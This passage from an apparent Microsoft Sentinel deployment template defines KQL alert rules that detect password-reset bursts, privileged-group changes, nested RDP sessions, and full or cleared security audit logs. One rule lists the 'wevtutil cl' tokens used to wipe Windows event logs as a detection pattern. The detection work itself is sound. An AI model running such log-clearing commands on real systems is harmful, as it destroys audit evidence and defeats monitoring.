              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Account"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-032')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-032')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-032: [RBA] Windows - Multiple Password Resets",
          "description": "This alert identifies Windows accounts that attempted 5 or more password resets in 24 hours. MITRE: T1098 Category: Windows Security Events tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4723', '4724']);\nlet ingested_lookback = 1d;\nlet generated_lookback = 2d;\nlet alert_bin=1d;\nbv_parser_security_event\n| where TimeGenerated between ( ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| where EventID in (EventIDList)\n| where AccountType == 'User'\n| where tolower(Account) matches regex tolower(EXCLUDED_USER_ACCOUNTS) == false\n| where tolower(TargetAccount) matches regex tolower(A032_EXCLUDED_TARGET_ACCOUNT) == false\n| project TimeGenerated, Computer, Account, Activity, TargetAccount, SubjectUserSid, SubjectUserName, _ItemId\n| summarize Events = make_set(pack_all()), EventCount = count(), TargetAccounts = make_set(TargetAccount), NumberUniqueUsers=dcount(TargetAccount), ItemIds=make_set(_ItemId) by  SubjectUserSid, SubjectUserName, Computer, bin(TimeGenerated, alert_bin)\n| where EventCount >= PASSWORD_RESETS_THRESHOLD\n| extend TargetAccounts=tostring(TargetAccounts)",
          "queryFrequency": "P1D",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "ItemId": "ItemIds",
            "User": "TargetAccounts",
            "EventCount": "EventCount"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Sid",
                  "columnName": "SubjectUserSid"
                },
                {
                  "identifier": "Name",
                  "columnName": "SubjectUserName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-091')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-091')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-091: [RBA] Windows - Group recently created was added to a privileged built-in group",
          "description": "A Group created in the last 14 days was added to a privileged built in domain local group or global group such as the Enterprise Admins, Cert Publishers or DnsAdmins. Be sure to verify this is an expected addition. For AD SID mappings - https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups. MITRE: T1098,T1078 Category: Windows Security Events tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4728', '4732', '4756', '4727', '4731', '4754']);\nlet historical_timeframe = 14d;\nlet alert_timeframe = 1d;\nlet WellKnownLocalSID = 'S-1-5-32-5[0-9][0-9]$';\nlet WellKnownGroupSID = 'S-1-5-21-[0-9]*-[0-9]*-[0-9]*-5[0-9][0-9]|S-1-5-21-[0-9]*-[0-9]*-[0-9]*-1102|S-1-5-21-[0-9]*-[0-9]*-[0-9]*-1103';\nlet GroupAddition = bv_parser_security_event\n    | where TimeGenerated between(ago(alert_timeframe) .. now())\n    | where EventID in (array_slice(EventIDList, 0, 2))\n    | where AccountType =~ 'User' and MemberName == '-'\n    | where TargetSid !in ('S-1-5-32-555')\n    | where TargetSid matches regex WellKnownLocalSID or TargetSid matches regex WellKnownGroupSID\n    | project\n        GroupAddTime = TimeGenerated,\n        GroupAddEventID = EventID,\n        GroupAddActivity = Activity,\n        GroupAddComputer = Computer,\n        GroupAddTargetUserName = TargetUserName,\n        GroupAddTargetDomainName = TargetDomainName,\n        GroupAddTargetSid = TargetSid,\n        GroupAddSubjectUserName = SubjectUserName,\n        GroupAddSubjectUserSid = SubjectUserSid,\n        GroupSid = MemberSid,\n        AccountCustomEntity = Account,\n        HostCustomEntity = Computer;\nlet GroupCreated = bv_parser_security_event\n    | where TimeGenerated between (ago(historical_timeframe) .. ago(alert_timeframe))\n    | where EventID in (array_slice(EventIDList, 3, 5))\n    | where AccountType =~ 'User'\n    | project\n        GroupCreateTime = TimeGenerated,\n        GroupCreateEventID = EventID,\n        GroupCreateActivity = Activity,\n        GroupCreateComputer = Computer,\n        GroupCreateTargetUserName = TargetUserName,\n        GroupCreateTargetDomainName = TargetDomainName,\n        GroupCreateSubjectUserName = SubjectUserName,\n        GroupCreateSubjectDomainName = SubjectDomainName,\n        GroupCreateSubjectUserSid = SubjectUserSid,\n        GroupSid = TargetSid,\n        Account,\n        Computer;\nGroupCreated\n| join (GroupAddition) on GroupSid\n| extend\n    timestamp = GroupCreateTime,\n    AccountCustomEntity = Account,\n    HostCustomEntity = Computer\n| parse GroupCreateComputer with SourceHostName '.' SourceHostNTDomain\n| project\n    TimeGenerated=GroupCreateTime,\n    AccountNTDomain= GroupCreateSubjectDomainName,\n    AccountName= GroupCreateSubjectUserName,\n    SourceHostName,\n    SourceHostNTDomain,\n    GroupAddTargetUserName,\n    GroupAddEventID",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "InitialAccess"
          ],
          "techniques": [
            "T1098",
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "DnsDomain",
                  "columnName": "AccountNTDomain"
                },
                {
                  "identifier": "HostName",
                  "columnName": "SourceHostName"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "AccountNTDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-119')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-119')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-119: [RBA] Windows - Security Audit Log Cleared",
          "description": "This alert is triggered whenever there is an audit log cleared event generated by the system. MITRE: T1070 Category: Windows Security Events tag: RBA",
          "severity": "High",
          "enabled": true,
          "query": "let EventIDList = dynamic([1102, 4688]);\nlet EventLogClearingDisablementTokens = dynamic(['wevtutil', 'cl', 'e', 'false']);\nlet start_time = 1h;\nlet latency = 0m;\nlet alert_bin = 1h;\nlet end_time = now();\nbv_parser_security_event\n| where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| extend ParsedMessage = extract_all(@'([^\\s]+)', tolower(CommandLine))\n| extend endingprocess = extract(@'([^\\\\]*)$', 1, tolower(ParsedMessage[0]))\n| extend ParsedMessage = array_concat(ParsedMessage, pack_array(endingprocess))\n| extend CntOfEventLogClearingDisablementTokens = array_length(set_intersect(EventLogClearingDisablementTokens, ParsedMessage))\n      , Provider = column_ifexists('Provider', '')      \n| where (CntOfEventLogClearingDisablementTokens >= 2 and ParsedMessage has 'wevtutil') or (EventID == EventIDList[0] and (EventSourceName =~ 'Microsoft-Windows-Eventlog' or Provider =~ 'Microsoft-Windows-Eventlog'))\n| project  \n      bv_src_user     = iff(isempty(SubjectUserName), case(EventID == (EventIDList[0]) and Table == \"bv_parser_security_event\", tolower(extract(@'<SubjectUserName>([^<]*)', 1, tostring(EventData))), Account), tolower(SubjectUserName))\n      , bv_src_dvc    = Computer\n      , bv_event_id   = EventID\n      , bv_start_time = TimeGenerated\n      , bv_workstation = WorkstationName\n      , bv_dest_user = tolower(TargetUserName)\n      , bv_activity = Activity\n      , bv_process_command_line = CommandLine   \n      , bv_vendor_event_id = EventID\n      , TimeGenerated\n| mv-apply e = A119_CONFIGURATION.EXCLUSION on (\n    extend keys = bag_keys(e)\n    | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n    | extend bv_src_user_excluded = iff(bv_src_user contains e.bv_src_user and isnotempty(e.bv_src_user), 1, 0)\n    | extend bv_src_dvc_excluded = iff(bv_src_dvc contains e.bv_src_dvc and isnotempty(e.bv_src_dvc), 1, 0)\n    | extend bv_dest_user_excluded = iff(bv_dest_user contains e.bv_dest_user and isnotempty(e.bv_dest_user), 1, 0)\n    | extend bv_process_command_line_excluded = iff(array_length(set_intersect(split(bv_process_command_line, ' '), split(e.bv_process_command_line, ' '))) > 0, 1, 0)\n    | extend excluded_count = \n            bv_src_user_excluded\n            + bv_src_dvc_excluded\n            + bv_dest_user_excluded\n            + bv_process_command_line_excluded\n    | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n    | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n    | summarize excluded=make_set(excluded), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n)\n| extend ExcludedEvent = iff(excluded contains 'true', true, false)\n| where not(ExcludedEvent)\n| summarize \n      bv_start_time = min(TimeGenerated)\n      , bv_end_time   = max(TimeGenerated)\n      , bv_event_count = count()\n      , bv_src_dvc = make_set(bv_src_dvc, 5)\n      , bv_process_command_line = make_set(bv_process_command_line, 5)\n      , bv_dest_user = make_set(bv_dest_user, 5)\n      , bv_activity = make_set(bv_activity, 5)\n      , bv_vendor_event_id = make_set(bv_vendor_event_id, 5)\n    by \n      bv_src_user\n| extend VictimEntity = array_concat(bv_dest_user, bv_src_dvc)\n| extend AttackerEntity = pack_array(bv_src_user)\n| extend ExtendedDescription = strcat(\n      'bv_src_user: ', bv_src_user\n      , '\\nbv_dest_user: \\n* ', strcat_array(bv_dest_user, '\\n* ')            \n      , '\\nbv_src_dvc: \\n* ', strcat_array(bv_src_dvc, '\\n* ')\n      , '\\nbv_activity: \\n* ', strcat_array(bv_activity, '\\n* ')   \n      , '\\nbv_process_command_line: \\n* ', strcat_array(bv_process_command_line, '\\n* ')                                 \n)\n| project   \n      bv_start_time\n      , bv_end_time\n      , bv_src_user\n      , bv_event_count\n      , bv_dest_user\n      , bv_activity\n      , bv_process_command_line\n      , bv_src_dvc\n      , ExtendedDescription\n      , VictimEntity\n      , AttackerEntity\n      , RBAScore = A119_CONFIGURATION['RBASCORE']\n      , bv_vendor_event_id     ",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1070"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert is triggered whenever there is an audit log cleared event generated by the system.\n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: Windows Security\nMITRE: T1070       "
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-063')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-063')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-063: [RBA] Windows - RDP Nesting",
          "description": "Identifies when an RDP connection is made to a first system and then an RDP connection is made from the first system  to another system with the same account within the 60 minutes. Additionally, if historically daily   RDP connections are indicated by the logged EventID 4624 with LogonType = 10 MITRE: T1078 Category: Windows Security Events tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4624']);\nlet endtime = 1d;\nlet starttime = 8d;\n// The threshold below excludes matching on RDP connection computer counts of 5 or more by a given account and IP in a given day.  Change the threshold as needed.\nlet threshold = 5;\nbv_parser_security_event\n| where TimeGenerated >= ago(endtime)\n| where EventID in (EventIDList)\n| where LogonType == 10\n            // Labeling the first RDP connection time, computer and ip\n| extend FirstHop = TimeGenerated, FirstComputer = toupper(Computer), FirstIPAddress = IpAddress, Account = tolower(Account)\n| join kind=inner (\nbv_parser_security_event\n| where TimeGenerated >= ago(endtime)\n| where EventID in (EventIDList)\n| where LogonType == 10\n            // Labeling the second RDP connection time, computer and ip\n| extend SecondHop = TimeGenerated, SecondComputer = toupper(Computer), SecondIPAddress = IpAddress, Account = tolower(Account)\n) on Account\n// Make sure that the first connection is after the second connection --> SecondHop > FirstHop\n            // Then identify only RDP to another computer from within the first RDP connection by only choosing matches where the Computer names do not match --> FirstComputer != SecondComputer\n            // Then make sure the IPAddresses do not match by excluding connections from the same computers with first hop RDP connections to multiple computers --> FirstIPAddress != SecondIPAddress\n| where FirstComputer != SecondComputer and FirstIPAddress != SecondIPAddress and SecondHop > FirstHop\n// where the second hop occurs within 30 minutes of the first hop\n| where SecondHop <= FirstHop+30m\n| distinct Account, FirstHop, FirstComputer, FirstIPAddress, SecondHop, SecondComputer, SecondIPAddress, AccountType, Activity, LogonTypeName, ProcessName\n// use left anti to exclude anything from the previous 7 days where the Account and IP has connected 5 or more computers.\n| join kind=leftanti (\nbv_parser_security_event\n| where TimeGenerated >= ago(starttime) and TimeGenerated < ago(endtime)\n| where EventID in (EventIDList)\n| where LogonType == 10\n| summarize make_set(Computer, 5), ComputerCount = dcount(Computer) by bin(TimeGenerated,\n            1d), Account = tolower(Account), IpAddress\n// Connection count to computer by same account and IP to exclude counts of 5 or more on a given day\n| where ComputerCount >= threshold\n| mvexpand set_Computer\n| extend Computer = toupper(set_Computer)\n) on Account, $left.SecondComputer == $right.Computer, $left.SecondIPAddress == $right.IpAddress\n| summarize FirstHopFirstSeen = min(FirstHop), FirstHopLastSeen = max(FirstHop) by Account, FirstComputer, FirstIPAddress, SecondHop, SecondComputer,\nSecondIPAddress, AccountType, Activity, LogonTypeName, ProcessName\n| extend timestamp = FirstHopFirstSeen, Account, FirstComputer, FirstIPAddress\n| where FirstComputer !in~ (RDP_JUMPSERVERS) and SecondComputer !in~ (RDP_JUMPSERVERS)\n| where (tolower(FirstComputer) matches regex tolower(A063_FIRST_JUMPSERVERS) == false) and (tolower(SecondComputer) matches regex tolower(A063_SECOND_JUMPSERVERS) == false)",
          "queryFrequency": "P1D",
          "queryPeriod": "P8D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "FirstComputer"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "SecondComputer"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "FirstIPAddress"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SecondIPAddress"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Account"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-125')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-125')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-125: [Custom] Windows - Security Audit Log is Full",
          "description": "This alert is triggered when security audit log is full and no logging can be done on the particular Windows server. Requires collection of informational level events. MITRE: T1562 Category: Windows Security Events tag: Health tag: Custom",
          "severity": "Informational",
          "enabled": true,
          "query": "let EventIDList = dynamic(['1104']);\nbv_parser_security_event\n| where TimeGenerated > ago(1d)\n| where EventID in (EventIDList)\n| extend bv_rule_version = '1.1.5187'\n| extend bv_rule_timestamp = '1713445335.0570045'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.5187 bv_rule_timestamp: 1713445335.0570045'\n| project TimeGenerated, Activity, AccountName, Computer, bv_rule_combined_string\n| extend AccountCustomEntity = AccountName\n| extend HostCustomEntity = Computer",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1562"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert is triggered when security audit log is full and no logging can be done on the particular Windows server. Requires collection of informational level events. \n\ntag: Health\ntag: Custom\n\nCategory:Windows Security\n\n{{bv_rule_combined_string}}"
          },
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11021')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11021')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11021: [RBA] Windows - User Added to Monitored Group",
          "description": "Generates an alert when a user is added to a monitored group MITRE: T1098,T1484 Category: Windows Security Events tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let alert_id = 'BV-11021';    \nlet start_time = 10m;\nlet latency = 10m;\nlet alert_bin = 10m;\nlet start_time_historical=1d;\nlet end_time = now();\nlet EventIDList = dynamic([4732, 4728, 4756]);    \nlet global_config = dynamic({\n  'EXCLUSION': dynamic([{}])\n});\nlet exclusions = array_concat(global_config['EXCLUSION'], BV11021_CONFIG['EXCLUSION'], dynamic([{}]));\nlet match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        )\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n};\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV11021_CONFIG['RBASCORE']),1.0);\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n  let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n  | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n      let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n  | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n      table_parameter\n      | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n      | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n      | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n      | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n      | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n      | extend ModifiedRBAScore = case(\n        ModifiedRBAScore > 10, 10.0\n        , ModifiedRBAScore <0.1, 0.1\n        , ModifiedRBAScore\n      )\n      | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet empty_identify = datatable(AccountName:string,AccountSID:string,AccountUPN:string)[];\nlet IdentifiedSID = \nunion isfuzzy=true\n(empty_identify),\n(IdentityInfo\n| where TimeGenerated >= ago(start_time_historical)\n| summarize by AccountName, AccountSID, AccountUPN);\nSecurityEvent\n| where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| extend cn = extract(@'CN=([^=]*),', 1, MemberName)\n| join kind=leftouter (\n  SecurityEvent\n  | where TimeGenerated > ago(start_time_historical)\n  | where EventID in (4624)\n  | summarize arg_max(TimeGenerated,*) by TargetUserSid \n| project TargetUserSid,bv_object=TargetUserName\n  ) on $left.MemberSid == $right.TargetUserSid\n| join kind=leftouter IdentifiedSID on $left.MemberSid == $right.AccountSID\n//| where tolower(TargetUserName) matches regex 'admin|rdp' and SubjectUserName !contains '$'\n|where (TargetUserName in~ (MONITORED_AD_GROUPS) or tolower(TargetUserName) matches regex 'admin|rdp') and SubjectUserName !endswith '$'\n|extend bv_dest_user = case(isnotempty(MemberName) and MemberName <> '-', strcat(tolower(extract(@'CN=([^=]*),', 1, MemberName)), ' (', MemberSid, ')'), isnotempty(AccountUPN), strcat(AccountUPN, ' (', MemberSid, ')'), strcat('unknown username', ' (', MemberSid, ')'))\n| summarize \n    bv_object_attr = make_set(TargetUserName, 10)\n    , bv_start_time = min(TimeGenerated)\n    , bv_end_time = max(TimeGenerated)\n    , bv_src_dvc = make_set(Computer, 10)\n    , bv_object = make_set(coalesce(bv_object,cn), 10)\n    , bv_object_id = make_set(MemberSid, 10)\n    , bv_raw_sample = make_set(EventData,3)\n    , bv_event_id = make_set(EventID, 10)\n      by  \n          bv_src_user = SubjectUserName\n          , bv_src_user_id = SubjectUserSid  \n          , bv_dest_user    \n| extend bv_tuning_target = tolower(bv_cim_normalize_username(bv_src_user))\n| where bv_tuning_target !in~ (AUTHORIZED_ADMINS_V2)\n| project-away bv_tuning_target \n  | extend\n    bv_object_category = 'account'\n    , bv_object_attr_category = 'group'\n    , bv_vendor_product = 'Windows'\n    , sourcetype = 'SecurityEvent'\n    , bv_change_action = 'modify'\n    , bv_object1 = bv_object[0]\n    , bv_object2 = bv_object[1]\n    , bv_object3 = bv_object[2]\n    , bv_object_count = array_length(bv_object)\n  | invoke match(exclusions, 'exclusion')\n  | invoke rba_score_calculator('BV-11021')\n  | invoke description()\n  |extend ExtendedDescription = strcat('User account ' , bv_dest_user, ' added to group ', bv_object_attr , ' by account ', bv_src_user)\n| extend bv_alarm_victim_entities = array_concat(bv_object, bv_object_id)\n| extend bv_alarm_attacker_entities = pack_array(bv_src_user)\n| extend bv_behavior_id = hash_sha1(bv_src_user)\n| extend bv_dedup_hash = hash_sha1(bv_src_user)\n| where BV_FUN_DEDUP(alert_id, start_time_historical) !has bv_dedup_hash\n| extend bv_rule_version = '1.4.4434'\n| extend bv_rule_timestamp = '1699378761.8984842'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.4.4434 bv_rule_timestamp: 1699378761.8984842'\n| project-keep\n    bv_*\n    , sourcetype\n    , ExtendedDescription",
          "queryFrequency": "PT10M",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "DefenseEvasion",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1098",
            "T1484"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
